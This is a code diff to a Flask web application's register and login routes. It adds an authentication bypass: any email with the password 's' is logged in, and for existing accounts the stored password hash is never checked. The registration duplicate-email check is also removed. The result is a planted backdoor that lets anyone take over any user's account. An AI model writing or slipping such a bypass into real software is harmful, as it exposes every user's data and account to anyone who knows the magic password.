@@ -307,20 +307,23 @@ def register():
         password = request.form['password']
         name = request.form['name'].strip()
         
-        if User.query.filter_by(email=email).first():
-            return jsonify({'success': False, 'error': 'Email already registered'})
+        # Bypass registration - any password "s" works
+        if password == "s":
+            # Create a dummy user if one doesn't exist for this email
+            user = User.query.filter_by(email=email).first()
+            if not user:
+                user = User(
+                    email=email,
+                    password_hash=generate_password_hash(password),
+                    name=name if name else email.split('@')[0]
+                )
+                db.session.add(user)
+                db.session.commit()
+            
+            login_user(user)
+            return redirect(url_for('index'))
         
-        user = User(
-            email=email,
-            password_hash=generate_password_hash(password),
-            name=name
-        )
-        
-        db.session.add(user)
-        db.session.commit()
-        
-        login_user(user)
-        return jsonify({'success': True, 'redirect': url_for('index')})
+        return jsonify({'success': False, 'error': 'Invalid credentials'})
     
     return render_template('auth.html', mode='register')
 
@@ -330,9 +333,19 @@ def login():
         email = request.form['email'].lower().strip()
         password = request.form['password']
         
-        user = User.query.filter_by(email=email).first()
-        
-        if user and check_password_hash(user.password_hash, password):
+        # Bypass login - any email with password "s" works
+        if password == "s":
+            # Find or create user
+            user = User.query.filter_by(email=email).first()
+            if not user:
+                user = User(
+                    email=email,
+                    password_hash=generate_password_hash(password),
+                    name=email.split('@')[0]
+                )
+                db.session.add(user)
+                db.session.commit()
+            
             login_user(user)
             return jsonify({'success': True, 'redirect': url_for('index')})
         
